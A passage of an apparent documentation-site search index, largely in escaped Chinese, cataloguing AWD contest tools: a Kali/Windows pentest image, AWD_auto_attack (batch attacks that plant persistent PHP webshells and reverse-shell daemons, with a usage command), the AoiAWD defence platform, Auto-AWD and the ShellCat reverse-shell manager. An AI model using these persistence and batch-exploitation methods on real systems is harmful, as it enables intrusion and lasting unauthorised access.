systems.</p>"},{"location":"Tool/Kali/#links","title":"Links","text":"<p>https://www.kali.org/</p> <p>https://www.kali.org/tools</p>"},{"location":"Tool/Windows/","title":"Windows10 Penetration Suite Toolkit within Kali Linux","text":""},{"location":"Tool/Windows/#system-description","title":"System Description","text":"<p>Based on the original Win10 Workstation 21H2 x64 image (not available for ARM devices).</p> <p>Complete installation of WSL Kali Linux 2022.3.</p> <p>streamline the software that comes with the system, beautify the fonts and some icons, and moderate optimization.</p> <p>using single-disk file storage to improve performance.</p> <p>Recommended runtime environment:</p> <ul> <li>vmware:16.x (VMware graphics memory 1G)</li> <li>Running memory:8G</li> <li>Solid State Drive:200G</li> </ul>"},{"location":"Tool/Windows/#links","title":"Links","text":"<p>https://github.com/makoto56/penetration-suite-toolkit</p>"},{"location":"Tool/AWD/AWD_auto_attack/","title":"AWD_auto_attack","text":"<p>\u4e00\u4e2a\u81ea\u52a8\u5316\u5199\u5165php\u4e0d\u6b7b\u9a6c/\u8fdb\u7a0b\u5b88\u62a4\u9a6c\uff0c\u6279\u91cf\u83b7\u5f97flag\u7684\u7ebf\u4e0b\u8d5b\u5de5\u5177</p> <p>\u811a\u672c\u4f1a\u6bcf\u9694360\u79d2\u4ecefiles/payload.txt\u53d6\u51fa\u653b\u51fb\u5411\u91cf\uff0c\u653b\u51fbfiles/ip.txt\u4e2d\u7684\u6bcf\u4e2aip\uff0c\u5982\u679c\u53ef\u4ee5\u5199\u5165webshell\uff0c\u5219\u5199\u5165\u4e0d\u6b7b\u9a6c\u548c\u8fdb\u7a0b\u5b88\u62a4\u3002\u8fd4\u56de\u4e0d\u6b7b\u9a6c\u7684\u5730\u5740\u548c\u8fdb\u7a0b\u5b88\u62a4\u53cd\u5f39\u7684\u7aef\u53e3\u3002\u5982\u679c\u4e0d\u53ef\u4ee5\u5199webshell\uff0c\u5219\u6839\u636e\u914d\u7f6e\u8bfb\u53d6flag\u3002</p>"},{"location":"Tool/AWD/AWD_auto_attack/#_1","title":"\u7528\u6cd5","text":"<pre><code>python attack.py -t 360 -r 192.168.1.1 -i 3\n</code></pre>"},{"location":"Tool/AWD/AWD_auto_attack/#_2","title":"\u6587\u4ef6\u5939\u7ed3\u6784","text":"<pre><code>\u251c\u2500\u2500 attack.py \u4e3b\u7a0b\u5e8f\n\u251c\u2500\u2500 files\n\u2502   \u251c\u2500\u2500 door.txt \u4e0d\u6b7b\u9a6c\u6587\u4ef6\n\u2502   \u251c\u2500\u2500 flag.txt \u6ca1\u6709\u7528\u7684\u6587\u4ef6\n\u2502   \u251c\u2500\u2500 ip.txt \u653b\u51fb\u7684ip\n\u2502   \u2514\u2500\u2500 payload.txt \u914d\u7f6e\u6587\u4ef6\n\u251c\u2500\u2500 lib\n\u2502   \u251c\u2500\u2500 kekong.py \u8fdb\u7a0b\u5b88\u62a4\u9a6c\u6587\u4ef6\n\u2502   \u2514\u2500\u2500 ua.txt ua\u5934\u6587\u4ef6\n\u251c\u2500\u2500 \u5176\u4ed6 \u6a21\u5757\u6587\u4ef6\n\u2514\u2500\u2500 README.txt \u672c\u6587\u4ef6\n</code></pre>"},{"location":"Tool/AWD/AWD_auto_attack/#_3","title":"\u914d\u7f6e\u8bf4\u660e","text":"<ol> <li>cookie\u8981\u7528\u9017\u53f7\u5206\u5272\uff0c\u9ed8\u8ba4\u7684\u5206\u53f7\u4f1a\u88ab\u5f53\u505a\u6ce8\u91ca\u7b26\u3002</li> <li>\u5fc5\u586b\u9879\u4e3a\uff1a[payload*] method getparam webshellreturn signal\u3002 \u5982\u679c\u662f\u53ef\u4ee5\u5199shell\u7684\u6f0f\u6d1e\uff0c\u5219\u586b\u5199webshellpath webshellpass\uff0c\u4e0d\u8981\u586b\u5199signal\u7684\u503c\u3002 \u5982\u679c\u4e0d\u53ef\u4ee5\u5199shell\uff0c\u8bf7\u586b\u5199signal\uff0c\u4e0d\u8981\u586b\u5199webshellpath webshellpass\u3002</li> <li>referer\uff0cua\uff0ccookie\u5934\u5747\u4e3a\u6d4b\u8bd5\u7684\u65f6\u5019\u52a0\u5165\u7684\uff0c\u6bd4\u8d5b\u4e2d\u5982\u679c\u4e0d\u9700\u8981\u53ef\u4ee5\u5220\u9664\u6216\u8005\u6ce8\u91ca\u6389\uff0c\u6ce8\u91ca\u7684\u65b9\u6cd5\u662f\u53e5\u5b50\u524d\u52a0\u2018#\u2019\u6216\u8005\u2018;\u2019</li> <li>\u811a\u672c\u5904\u7406\u4e0d\u6b7b\u9a6c\u7684\u903b\u8f91\u662f\u5c06\u4e0d\u6b7b\u9a6c\u4e2d\u7684{name}\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u6587\u4ef6\u4f20\u5165\u5230\u76ee\u6807\u4e3b\u673a\u3002\u8bbf\u95ee\u8fd9\u4e2a\u4e0d\u6b7b\u9a6c\u751f\u6210\u771f\u6b63\u7684\u4e0d\u6b7b\u9a6c\u3002\u4e0d\u6b7b\u9a6c\u7684\u5f62\u5f0f\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u4f46\u52a1\u5fc5\u4f20\u5165\u7684\u53c2\u6570\u662fbase64\u683c\u5f0f\uff0c\u4f20\u5165\u7684\u952e\u4e3asxsx23\uff0c\u56e0\u4e3a\u811a\u672c\u4f1a\u7528sxsx23\u53d1\u9001\u4e00\u4e2abase64\u7f16\u7801\u540e\u7684phpinfo\u6765\u68c0\u67e5\u4e0d\u6b7b\u9a6c\u7684\u901a\u8baf\u60c5\u51b5\uff0c\u540e\u7eed\u4f7f\u7528\u811a\u672c\u83b7\u5f97flag\u65f6\u4e5f\u4f1a\u4f7f\u7528sxsx23\u548cbase64\u7f16\u7801\u540e\u7684\u5185\u5bb9\u83b7\u5f97\u3002</li> </ol>"},{"location":"Tool/AWD/AWD_auto_attack/#_4","title":"\u4e0d\u8db3","text":"<ol> <li>\u53ea\u80fd\u5229\u7528\u53ef\u4ee5\u53d1\u9001\u5355\u6b21payload\u7684\u6f0f\u6d1e\u3002</li> <li>\u81ea\u52a8\u83b7\u5f97flag\u7684\u529f\u80fd\u5728\u9047\u5230\u8fd4\u56de\u9875\u9762\u4e2d\u5939\u6742\u5f88\u591a\u5176\u4ed6\u65e0\u7528\u6570\u636e\u7684\u65f6\u5019\u4f53\u9a8c\u5f88\u7cdf\u7cd5</li> <li>\u4ee3\u7801\u5199\u7684\u592a\u70c2</li> </ol>"},{"location":"Tool/AWD/AWD_auto_attack/#link","title":"Link","text":"<p>Github repo: https://github.com/Hecbi/awd_auto_attack</p>"},{"location":"Tool/AWD/AoiAWD/","title":"AoiAWD","text":"<p>A general defense platform for AWD.</p>"},{"location":"Tool/AWD/AoiAWD/#_1","title":"\u7f16\u8bd1\u3001\u5b89\u88c5\u4e0e\u4f7f\u7528\u65b9\u6cd5","text":""},{"location":"Tool/AWD/AoiAWD/#_2","title":"\u6784\u5efa\u65b9\u6cd5","text":"<p>\u53c2\u8003\u6784\u5efa\u6d41\u7a0b\u7b80\u4ecb\u8fdb\u884c\u64cd\u4f5c: BUILD.md</p>"},{"location":"Tool/AWD/AoiAWD/#mongodb-server","title":"MongoDB Server","text":"<p>\u7528\u4e8e\u8bb0\u5f55\u5e9e\u5927\u7684\u6d41\u91cf\u6587\u4ef6\u7684\u6570\u636e\u5e93\uff0c\u662f\u6574\u4e2a\u7cfb\u7edf\u7684\u6838\u5fc3\u5b58\u50a8\u3002</p> <ul> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u5efa\u8bae\u548cAoiAWD Core\u4e00\u8d77\u90e8\u7f72\u5728\u9009\u624b\u81ea\u5df1\u53ef\u63a7\u7684\u4e3b\u673a\u4e0a\u3002</li> <li>\u65e0\u9700\u989d\u5916\u7684\u914d\u7f6e\uff0cUbuntu\u73af\u5883\u4e0b\u5f00\u7bb1\u5373\u7528\uff0capt\u4e00\u4e0b\u5373\u53ef\u641e\u5b9a\u3002</li> </ul>"},{"location":"Tool/AWD/AoiAWD/#frontend","title":"Frontend","text":"<p>Vue\u7f16\u5199\u7684Web\u524d\u7aef\uff0c\u7528\u6765\u6d4f\u89c8\u65e5\u5fd7\uff0c\u4ea7\u751f\u62a5\u8b66\u52a8\u753b\u7b49\u53ef\u89c6\u5316\u5c55\u793a\u3002</p> <ul> <li>\u4f7f\u7528npm\u7f16\u8bd1\u6253\u5305\u3002</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u7f16\u8bd1\u540e\u5c06\u4e0eAoiAWD Core\u96c6\u6210\u4e3a\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002</li> <li>\u65e0\u9700\u5355\u72ec\u7684\u8fd0\u884c\u542f\u52a8\u3002</li> </ul>"},{"location":"Tool/AWD/AoiAWD/#aoiawd-core","title":"AoiAWD Core","text":"<p>\u662f\u6574\u4e2a\u7cfb\u7edf\u8fd0\u884c\u7684\u6838\u5fc3\uff0c\u8d1f\u8d23\u63a2\u9488\u6570\u636e\u6536\u96c6\u5165\u5e93\u3001\u63d2\u4ef6\u751f\u547d\u5468\u671f\u7ba1\u7406\u3001Web\u524d\u7aef\u6258\u7ba1\u670d\u52a1\u3002</p> <ul> <li>\u8fd0\u884ccompile.php\u5373\u53ef\u6253\u5305\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u65b9\u4fbf\u643a\u5e26\u3002</li> <li>\u63d2\u4ef6\u9700\u8981\u653e\u5230\u548caoiawd.phar\u540c\u76ee\u5f55\u4e0b\u7684plugins\u6587\u4ef6\u5939\uff0cWeb\u7aef\u6709\u76f4\u63a5\u91cd\u8f7d\u63d2\u4ef6\u7684\u6309\u94ae\uff0c\u53ef\u4ee5\u5b9e\u73b0\u70ed\u66f4\u65b0\u3002</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u53ef\u76f4\u63a5\u65e0\u53c2\u6570\u8fd0\u884c\uff0c\u5982\u679c\u9700\u8981\u7279\u522b\u7684\u914d\u7f6e\uff0c\u53ef\u4ee5\u589e\u52a0-h\u53c2\u6570\u67e5\u770b\u5e2e\u52a9\u4fe1\u606f\u3002</li> </ul> <pre><code>AoiAWD: Data Visualization Tool &amp; Main Server\nUsage: ./aoiawd.phar [OPTIONS]\n         -w [URI] HTTP server bind URI. Default: tcp://0.0.0.0:1337\n         -l [URI] Log recoard server bind URI. Default: tcp://0.0.0.0:8023\n         -m [URI] MongoDB server URI. Default: mongodb://127.0.0.1:27017\n         -t [STRING] Access token. Default: [RANDOM]\n         -h This help info\n</code></pre> <ul> <li>\u8fd0\u884c\u540e\u4f1a\u663e\u793a\u672c\u6b21\u542f\u52a8\u540e\u7684\u4e34\u65f6\u5bc6\u94a5\uff0c\u662f\u8bbf\u95eeWeb\u524d\u7aef\u7684\u5fc5\u8981\u4fe1\u606f</li> </ul> <pre><code>[2020-09-24 15:21:21] MainServer.notice: AccessToken: 0de8d57b3e91dc66 [] [] #&lt;-- Web\u8bbf\u95ee\u5bc6\u94a5\n...\n[2020-09-24 15:21:21] Amp\\Http\\Server\\Server.info: Listening on http://0.0.0.0:1337/ [] [] #&lt;-- Web\u524d\u7aef\u5730\u5740\n[2020-09-24 15:21:21] aoicommon\\socket\\AsyncTCPServer.info: Listening on 0.0.0.0:8023 [] [] #&lt;-- \u63a2\u9488\u4e0a\u7ebf\u5730\u5740\n</code></pre>"},{"location":"Tool/AWD/AoiAWD/#guardian","title":"Guardian","text":"<p>\u4e00\u4e2a\u4e8c\u8fdb\u5236PWN\u7684\u5f71\u5b50\u5916\u58f3\uff0c\u5176\u539f\u7406\u662f\u5305\u88f9\u5728PWN\u9898\u76ee\u5916\u4fa7\uff0c\u5728\u6bcf\u6b21\u88ab\u542f\u52a8\u7684\u65f6\u5019\u900f\u660e\u8bb0\u5f55STDIN\u4e0eSTDOUT\u7684\u6d41\u91cf\uff0c\u5e76\u5feb\u7167PWN\u7a0b\u5e8f\u7684\u5185\u5b58\u7ed3\u6784(/proc/????/mem)\u4e0a\u4f20\u56deAoiAWD Core\u3002</p> <ul> <li>\u5728\u9879\u76ee\u76ee\u5f55\u8fd0\u884ccompile.php\u5c06\u4f1a\u7f16\u8bd1\u5f71\u5b50\u58f3\u7a0b\u5e8f\u548c\u6346\u7ed1\u7a0b\u5e8f: guardian.phar\uff0c\u4e00\u822c\u662f\u5728\u9009\u624b\u7535\u8111\u4e0a\u8fdb\u884c\u6346\u7ed1\u540e\u5c06\u751f\u6210\u6587\u4ef6\u4e0a\u4f20\u5230\u9776\u673a\u3002</li> <li>\u76f4\u63a5\u8fd0\u884c\u6346\u7ed1\u7a0b\u5e8f\u4f1a\u8f93\u51fa\u5e2e\u52a9\u6587\u672c\uff0c\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u4e9b\u53c2\u6570\u662f:</li> <li>-i: \u8f93\u5165\u9700\u8981\u5957\u58f3\u7684PWN\u9898\u76ee\u7a0b\u5e8f\u8def\u5f84</li> <li>-s: \u8f93\u5165\u53ef\u4ee5\u4ece\u9776\u673a\u8bbf\u95ee\u5230\u63a2\u9488\u4e0a\u7ebf\u5730\u5740\u7684URL\uff0c\u6bd4\u5982\u8bf4192.168.???.???:8023</li> </ul> <pre><code>Guardian: AoiAWD ELF PWNMonitor Tool\nUsage: ./guardian.phar [PATH]\n         -i [PATH] Original ELF.\n         -o [PATH] Path of patched ELF. Default: {$OriginalELF}.guardianed\n         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023\n         -h This help info\n</code></pre>"},{"location":"Tool/AWD/AoiAWD/#tapeworm","title":"TapeWorm","text":"<p>\u4e00\u4e2aPHP Web\u7684\u5f71\u5b50\u5916\u58f3\uff0c\u5176\u539f\u7406\u662f\u81ea\u52a8\u6ce8\u5165\u5230\u6240\u6709PHP\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u652f\u6301\u8f93\u5165\u8f93\u51fa\u6d41\u91cf\u7684\u6293\u53d6\u4e0e\u4e0a\u62a5\uff0c\u540c\u65f6\u5177\u6709\u5904\u7406\u8f93\u51fa\u6570\u636e\u7684\u80fd\u529b\uff0c\u5b9e\u73b0\u8f93\u51fa\u5185\u5bb9\u7be1\u6539\u3002</p> <ul> <li>\u7a0b\u5e8f\u5185\u90e8\u7684\u4ee3\u7801\u5df2\u7ecf\u5b9e\u73b0\u4e86\u5355\u5b9e\u4f8b\u542f\u52a8\uff0c\u5373\u4fbf\u662f\u5c42\u5c42include\u4e86\u591a\u6b21\uff0c\u4e5f\u53ea\u4f1a\u8fd0\u884c\u6700\u5148\u89e6\u53d1\u7684\u5f71\u5b50\u5916\u58f3\u3002\u6240\u4ee5\u4e0d\u7528\u62c5\u5fc3\u590d\u6742\u7684\u9898\u76ee\u5f71\u54cd\u6027\u80fd\u3002</li> <li>\u81ea\u52a8\u6ce8\u5165\u7a0b\u5e8f\u4f1a\u667a\u80fd\u8bc6\u522b\u9762\u5411\u5bf9\u8c61\u7684\u6587\u4ef6(\u5305\u542b namespace \u5173\u952e\u5b57)\uff0c\u548c\u76f4\u63a5\u9762\u5411\u8fc7\u7a0b\u7684PHP\u6587\u4ef6\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u9020\u6210\u8bed\u6cd5\u9519\u8bef\u3002</li> <li>\u81ea\u52a8\u6ce8\u5165\u7a0b\u5e8f\u4f1a\u8bc6\u522b\u5df2\u7ecf\u88ab\u6ce8\u5165\u7684\u811a\u672c\u5e76\u52a0\u4ee5\u8df3\u8fc7\uff0c\u6240\u4ee5\u591a\u6b21\u53cd\u590d\u65e0\u8111\u5bf9web\u6839\u76ee\u5f55\u8fd0\u884c\u6ce8\u5165\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u9020\u6210\u4ec0\u4e48\u592a\u5927\u7684\u95ee\u9898\u3002</li> <li>\u8fd0\u884ccompile.php\u5c31\u53ef\u4ee5\u751f\u6210\u81ea\u52a8\u6ce8\u5165\u7a0b\u5e8f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4e0a\u4f20\u5230\u9776\u673a\u4e0a\u76f4\u63a5\u5bf9web\u6839\u76ee\u5f55\u8fdb\u884c\u6ce8\u5165\uff0c\u6216\u8005\u5728\u9009\u624b\u7535\u8111\u4e0a\u6ce8\u5165\u597d\u4e4b\u540e\u518d\u4e0a\u4f20\u5230\u9776\u673a\u4e0a\u3002</li> <li>\u4e00\u65f6\u6ce8\u5165\u4e00\u65f6\u723d\uff0c\u5fd8\u8bb0\u5907\u4efd\u5b95\u673a\u614c</li> <li>\u76f4\u63a5\u8fd0\u884c\u6ce8\u5165\u7a0b\u5e8f\u4f1a\u663e\u793a\u5e2e\u52a9\u6587\u672c\uff0c\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u4e9b\u53c2\u6570\u662f:</li> <li>-d: \u9700\u8981\u6ce8\u5165\u5916\u58f3\u7684web\u6839\u76ee\u5f55\uff0c\u4f1a\u4ece\u6b64\u76ee\u5f55\u9012\u5f52\u611f\u67d3\u6240\u6709\u7684PHP\u6587\u4ef6\u3002</li> <li>-s: \u8f93\u5165\u53ef\u4ee5\u4ece\u9776\u673a\u8bbf\u95ee\u5230\u63a2\u9488\u4e0a\u7ebf\u5730\u5740\u7684URL\uff0c\u6bd4\u5982\u8bf4192.168.???.???:8023\u3002</li> </ul> <pre><code>TapeWorm: AoiAWD PHP WebMonitor Tool\nUsage: ./tapeworm.phar [PATH]\n         -d [PATH] WebMonitor inject dir.\n         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023\n         -f [PATH] Inject file path. Default: {$dir}\n         -h This help info\n</code></pre>"},{"location":"Tool/AWD/AoiAWD/#roundworm","title":"RoundWorm","text":"<p>\u4e00\u4e2a\u76d1\u63a7\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdb\u7a0b\u7684\u7cfb\u7edf\u884c\u4e3a\u76d1\u89c6\u5668\uff0c\u5176\u539f\u7406\u662f\u626b\u63cf/proc\u6587\u4ef6\u5939\u83b7\u53d6\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u6240\u6709\u8fdb\u7a0b\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5229\u7528Linux\u7cfb\u7edf\u7684inotify\u529f\u80fd\u5bf9\u6307\u5b9a\u6587\u4ef6\u5939\u7684\u654f\u611f\u6587\u4ef6\u64cd\u4f5c\u8fdb\u884c\u5168\u9762\u7684\u8bb0\u5f55\u3002</p> <ul> <li>\u76f4\u63a5\u8fd0\u884cmake\u5c31\u53ef\u4ee5\u7f16\u8bd1\u751f\u6210</li> <li>\u4e00\u822c\u6765\u8bb2\u8be5\u7a0b\u5e8f\u5728\u9776\u673a\u4e0a\u8fd0\u884c\uff0c\u9009\u624b\u7535\u8111\u4e0a\u6ca1\u5fc5\u8981\u6267\u884c\u8fd9\u73a9\u610f\u3002</li> <li>\u6dfb\u52a0-h\u53c2\u6570\u5373\u53ef\u770b\u5230\u5e2e\u52a9\u6587\u6863\uff0c\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u4e9b\u53c2\u6570\u662f:</li> <li>-d: \u540e\u53f0\u8fd0\u884c\uff0c\u4f60\u5f53\u7136\u4e0d\u60f3\u5173\u6389ssh\u7684\u65f6\u5019\u5c31\u628a\u63a2\u9488\u4e5f\u7ed9\u5173\u4e86\u3002</li> <li>-s: \u8f93\u5165\u53ef\u4ee5\u4ece\u9776\u673a\u8bbf\u95ee\u5230\u63a2\u9488\u4e0a\u7ebf\u5730\u5740\u7684IP\uff0c\u6bd4\u5982\u8bf4192.168.???.???\u3002</li> <li>-w: \u9700\u8981\u76d1\u63a7\u6587\u4ef6\u53d8\u5316\u7684\u8def\u5f84\uff0c\u5982\u679c\u6709\u591a\u4e2a\u8def\u5f84\u4f7f\u7528';'\u5206\u5272\uff0c\u6bd4\u5982: -w \"/tmp;/var/www/html\"</li> </ul> <pre><code>RoundWorm: AoiAWD Filesystem &amp; Process Monitor Tool\nUsage: ./roundworm [OPTIONS]\n         -d Running in daemon mode.\n         -s [HOST] AoiAWD Probe IP. Default: 127.0.0.1\n         -p [PORT] AoiAWD Probe PORT. Default: 8023\n         -w [PATH] Inotify watch dir, ';' as divider. Default: /tmp\n         -i [MSECOND] Process watch interval. Default: 100\n         -h This help info\n</code></pre>"},{"location":"Tool/AWD/AoiAWD/#_3","title":"\u5e94\u7528\u573a\u666f","text":"<p>\u5728\u5e38\u89c1\u7684AWD\u6bd4\u8d5b\u4e2d\uff0c\u9009\u624b\u5f80\u5f80\u62e5\u6709\u4e00\u53f0\uff08\u6216\u82e5\u5e72\u53f0\uff09\u5f00\u653e\u4e86SSH\u670d\u52a1\u548c\u9898\u76ee\u670d\u52a1\u7684\u201c\u9776\u673a\u201d\u4f5c\u4e3a\u81ea\u5df1\u9632\u5b88\u7684\u9635\u5730\u3002</p> <p>\u5728\u5b9e\u9645\u6bd4\u8d5b\u4e2d\uff0c\u4e3b\u529e\u65b9\u5f80\u5f80\u4f1a\u9650\u5236\u9009\u624b\u7684SSH\u6743\u9650\u5230\u4e00\u822c\u7528\u6237/\u4ec5\u53ef\u7ba1\u7406\u9898\u76ee\u7684\u6743\u9650\u3002\u5e76\u4e14\u9488\u5bf9\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u7528\u9632\u706b\u5899\u811a\u672c\uff08\u901a\u9632\u811a\u672c\uff09\u8fdb\u884c\u8f6e\u8be2\u5f0fcheck\u3002</p> <p>AoiAWD\u662f\u9488\u5bf9\u4ee5\u4e0a\u573a\u666f\u7684\u9650\u5236\u548c\u75db\u70b9\u8bbe\u8ba1\u7684\uff0c\u7ec4\u4ef6\u95f4\u57fa\u4e8esocket\u901a\u4fe1\u4ee5\u4fbf\u7075\u6d3b\u90e8\u7f72\uff0c\u5177\u6709\u56fe\u5f62\u53ef\u89c6\u5316\u754c\u9762\u3002\u6240\u6709\u884c\u4e3a\u63a2\u9488\u5747\u652f\u6301\u5728\u6700\u4f4e\u7cfb\u7edf\u6743\u9650\u4e0b\u8fd0\u884c\uff0c\u4e14\u9ed8\u8ba4\u4e0d\u4f1a\u5e72\u6270\u9898\u76ee\u4e1a\u52a1\u903b\u8f91\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u7edd\u5927\u90e8\u5206check\u811a\u672c\u7684\u884c\u4e3a\u68c0\u67e5\u3002\u652f\u6301\u5982\u4e0b\u7ef4\u5ea6\u7684\u884c\u4e3a\u6355\u83b7\u80fd\u529b\uff1a</p> <ul> <li>Web\u8f93\u5165\u8f93\u51fa\u6570\u636e\u6355\u83b7\u3001\u8f93\u51fa\u6d41\u91cf\u7be1\u6539\uff08\u6ca1\u9519\uff0c\u4f60\u53ef\u4ee5\u52a8\u6001\u66ff\u6362\u6389\u8f93\u51fa\u7684flag\u4e3a\u4efb\u610f\u5b57\u7b26\u4e32\uff09</li> <li>PWN\u7c7b\u9898\u76ee\u8f93\u5165\u8f93\u51fa\u4ea4\u4e92\u6d41\u91cf\u5305\u6355\u83b7\u3001\u5f53\u6b21\u8fd0\u884c\u65f6\u5185\u5b58\u7ed3\u6784\u6355\u83b7\u3001\u8f93\u51fa\u6d41\u91cf\u7be1\u6539</li> <li>\u670d\u52a1\u5668\u8fdb\u7a0bUID\u3001PID\u3001\u7236\u8fdb\u7a0b\u3001\u542f\u52a8\u53c2\u6570\u3001\u8fd0\u884c\u65f6\u95f4\u6355\u83b7</li> <li>\u670d\u52a1\u5668\u6587\u4ef6\u7cfb\u7edf\u65b0\u5efa\u3001\u5220\u9664\u3001\u4fee\u6539\u3001\u6743\u9650\u53d8\u5316\u884c\u4e3a\u6355\u83b7\u3002</li> </ul> <p>\u672c\u7cfb\u7edf\u8fd8\u5185\u7f6e\u4e86\u751f\u547d\u5468\u671f\u94a9\u5b50\uff0c\u53ef\u4ee5\u9488\u5bf9\u67d0\u4e00\u6b21\u884c\u4e3a\u7684\u4ea7\u751f\u7f16\u5199\u7279\u5b9a\u7684\u63d2\u4ef6\u53bb\u5b9e\u73b0\u6d41\u91cf\u5c42\u9762\u7684\u4e34\u65f6\u70ed\u8865\u4e01\u3001\u589e\u52a0\u5927\u5c4f\u544a\u8b66\u3001\u66ff\u6362\u8f93\u51fa\u5b57\u7b26\u7b49\u64cd\u4f5c\u3002\u7cfb\u7edf\u9ed8\u8ba4\u5185\u7f6e\u4e86\u5982\u4e0b\u63d2\u4ef6\u53ef\u4f9b\u53c2\u8003\uff1a</p> <ul> <li>FlagBuster: \u5f53\u68c0\u6d4b\u5230\u8f93\u51fa\u6d41\u91cf\u4e2d\u5305\u542b\u4e86\u7b26\u5408\u6b63\u5219\u7684flag\u5b57\u7b26\u4e32\uff0c\u4ea7\u751f\u5927\u5c4f\u544a\u8b66\u3001\u6807\u8bb0\u89e6\u53d1\u89c4\u5219\u7684\u6570\u636e\u5305\u3001\u5e76\u5c06flag\u7cbe\u51c6\u66ff\u6362\u4e3a\u770b\u8d77\u6765\u4e5f\u50cfflag\u7684\u968f\u673a\u6570\u3002</li> <li>KingWatcher: KoH\u7c7b\u6bd4\u8d5b\u4e2d\uff0c\u5f53\u6709\u5176\u4ed6\u961f\u4f0d\u66ff\u6362\u6389\u4e86\u8d5b\u70b9\u6587\u4ef6\u65f6\uff0c\u4ea7\u751f\u5927\u5c4f\u544a\u8b66\u3002</li> <li>ZombieKiller: \u5f53\u6587\u4ef6\u7cfb\u7edf\u4e0a\u51fa\u73b0\u4e86\u4e0d\u6b7b\u9a6c\u884c\u4e3a\uff0c\u6807\u8bb0\u53ef\u7591\u6587\u4ef6\u5e76\u4ea7\u751f\u5927\u5c4f\u544a\u8b66\u3002</li> </ul>"},{"location":"Tool/AWD/AoiAWD/#_4","title":"\u7cfb\u7edf\u7b80\u4ecb","text":"<p>AoiAWD \u5206\u4e3a\u516d\u4e2a\u7ec4\u4ef6\uff0c\u7ec4\u4ef6\u95f4\u4e92\u76f8\u914d\u5408\u5b9e\u73b0\u7cfb\u7edf\u7684\u5b8c\u6574\u529f\u80fd</p> <ul> <li>MongoDB Server: \u65e5\u5fd7\u6570\u636e\u5b58\u50a8\u6570\u636e\u5e93</li> <li>AoiAWD Core: \u4e2d\u5fc3\u6570\u636e\u5904\u7406\u4e0e\u63d2\u4ef6\u540e\u7aef\u670d\u52a1\u5668</li> <li>Frontend: \u6570\u636e\u53ef\u89c6\u5316\u5e73\u53f0\u524d\u7aef</li> <li>Guardian: PWN\u884c\u4e3a\u63a2\u9488</li> <li>TapeWorm: Web\u884c\u4e3a\u63a2\u9488</li> <li>RoundWorm: \u7cfb\u7edf\u8fdb\u7a0b\u4e0e\u6587\u4ef6\u7cfb\u7edf\u884c\u4e3a\u63a2\u9488</li> </ul> <p></p>"},{"location":"Tool/AWD/AoiAWD/#_5","title":"\u7cfb\u7edf\u622a\u56fe","text":""},{"location":"Tool/AWD/AoiAWD/#_6","title":"\u767b\u9646\u754c\u9762","text":""},{"location":"Tool/AWD/AoiAWD/#_7","title":"\u4eea\u8868\u76d8","text":""},{"location":"Tool/AWD/AoiAWD/#web","title":"Web\u65e5\u5fd7\u5217\u8868","text":""},{"location":"Tool/AWD/AoiAWD/#web_1","title":"Web\u65e5\u5fd7\u8be6\u60c5","text":""},{"location":"Tool/AWD/AoiAWD/#pwn","title":"PWN\u65e5\u5fd7\u5217\u8868","text":""},{"location":"Tool/AWD/AoiAWD/#pwn_1","title":"PWN\u65e5\u5fd7\u8be6\u60c5","text":""},{"location":"Tool/AWD/AoiAWD/#_8","title":"\u6587\u4ef6\u7cfb\u7edf\u65e5\u5fd7\u5217\u8868","text":""},{"location":"Tool/AWD/AoiAWD/#_9","title":"\u7cfb\u7edf\u8fdb\u7a0b\u5217\u8868","text":""},{"location":"Tool/AWD/AoiAWD/#_10","title":"\u544a\u8b66\u65e5\u5fd7\u5217\u8868","text":""},{"location":"Tool/AWD/AoiAWD/#_11","title":"\u53cc\u51fb\u544a\u8b66\u65e5\u5fd7\u540e\u9ad8\u4eae\u5173\u8054","text":""},{"location":"Tool/AWD/AoiAWD/#link","title":"Link","text":"<p>Github repo: https://github.com/DasSecurity-HatLab/AoiAWD</p>"},{"location":"Tool/AWD/Auto-AWD/","title":"Auto-AWD","text":"<p>Auto-AWD will auto run the payload and submit flag to platform every round</p>"},{"location":"Tool/AWD/Auto-AWD/#demo","title":"Demo","text":""},{"location":"Tool/AWD/Auto-AWD/#getting-started","title":"Getting Started","text":""},{"location":"Tool/AWD/Auto-AWD/#prerequisites","title":"Prerequisites","text":"<ul> <li>python3</li> <li>pip/pipenv</li> </ul>"},{"location":"Tool/AWD/Auto-AWD/#installation","title":"Installation","text":"<p>Just install python packages: <code>pipenv install</code></p>"},{"location":"Tool/AWD/Auto-AWD/#usage","title":"Usage","text":"<ol> <li>Config your game rules in config.yml,like <code>config.template.yml</code></li> <li><code>python awd.py</code></li> </ol>"},{"location":"Tool/AWD/Auto-AWD/#link","title":"Link","text":"<p>Github repo: https://github.com/XuCcc/Auto-AWD#getting-started</p>"},{"location":"Tool/AWD/ShellCat/","title":"ShellCat","text":"<p>\u4e00\u4e2a\u96c6\u4e2d\u7ba1\u7406\u53cd\u5f39 Shell \u7684\u7a0b\u5e8f\uff0c\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3\uff0c\u7136\u540e\u6240\u6709\u7684\u53cd\u5f39 Shell \u90fd\u8fde\u5230\u8fd9\u4e2a\u7aef\u53e3\u3002</p> 